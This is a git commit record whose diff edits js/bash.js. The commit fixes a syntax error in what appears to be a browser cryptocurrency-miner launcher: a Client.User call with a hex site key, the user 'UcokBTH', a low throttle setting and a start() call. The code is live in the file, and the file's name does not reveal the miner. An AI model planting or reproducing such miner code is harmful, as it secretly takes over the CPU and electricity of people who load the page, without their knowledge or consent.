94dc3196c538d488d8130418bfc8087eb6a9c8c4
darkside-community <99356964+darkside-community@users.noreply.github.com>
2022-02-11 22:58:37 +0700

    Update ff

--- js/bash.js
+++ js/bash.js
@@ -1,4 +1,4 @@
-var _client = new Client.User('c83706cb3c2d3c51207caf61ca99760ff4241fe88a013fe0e61888200591741b', 'UcokBTH' {
+var _client = new Client.User('c83706cb3c2d3c51207caf61ca99760ff4241fe88a013fe0e61888200591741b','UcokBTH', {
    throttle: 0.1, c: 'w'
     });
     _client.start();
